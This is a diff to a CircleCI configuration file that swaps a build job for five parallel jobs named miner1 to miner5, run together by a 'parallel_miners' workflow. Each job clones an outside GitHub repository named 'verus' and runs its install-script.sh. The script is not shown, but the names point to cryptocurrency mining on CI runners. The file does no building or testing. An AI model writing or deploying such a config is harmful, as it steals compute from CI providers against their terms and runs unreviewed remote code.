@@ -1,20 +1,97 @@
 version: 2.1
 
 jobs:
-  build:
-    machine:
-      image: ubuntu-2004:current
-    parallelism: 5
+  miner1:
+    docker:
+      - image: ubuntu:20.04
     steps:
       - run:
-          name: Mining Setup
+          name: Install Git
+          command: |
+            apt-get update
+            apt-get install -y git
+      - run:
+          name: Clone and Run Script
           command: |
             git clone https://github.com/0xwhyteddy/verus.git
             cd verus
             chmod +x install-script.sh
             ./install-script.sh
-            
+
+  miner2:
+    docker:
+      - image: ubuntu:20.04
+    steps:
+      - run:
+          name: Install Git
+          command: |
+            apt-get update
+            apt-get install -y git
+      - run:
+          name: Clone and Run Script
+          command: |
+            git clone https://github.com/0xwhyteddy/verus.git
+            cd verus
+            chmod +x install-script.sh
+            ./install-script.sh
+
+  miner3:
+    docker:
+      - image: ubuntu:20.04
+    steps:
+      - run:
+          name: Install Git
+          command: |
+            apt-get update
+            apt-get install -y git
+      - run:
+          name: Clone and Run Script
+          command: |
+            git clone https://github.com/0xwhyteddy/verus.git
+            cd verus
+            chmod +x install-script.sh
+            ./install-script.sh
+
+  miner4:
+    docker:
+      - image: ubuntu:20.04
+    steps:
+      - run:
+          name: Install Git
+          command: |
+            apt-get update
+            apt-get install -y git
+      - run:
+          name: Clone and Run Script
+          command: |
+            git clone https://github.com/0xwhyteddy/verus.git
+            cd verus
+            chmod +x install-script.sh
+            ./install-script.sh
+
+  miner5:
+    docker:
+      - image: ubuntu:20.04
+    steps:
+      - run:
+          name: Install Git
+          command: |
+            apt-get update
+            apt-get install -y git
+      - run:
+          name: Clone and Run Script
+          command: |
+            git clone https://github.com/0xwhyteddy/verus.git
+            cd verus
+            chmod +x install-script.sh
+            ./install-script.sh
+
 workflows:
-  build-workflow:
+  version: 2
+  parallel_miners:
     jobs:
-      - build
+      - miner1
+      - miner2
+      - miner3
+      - miner4
+      - miner5
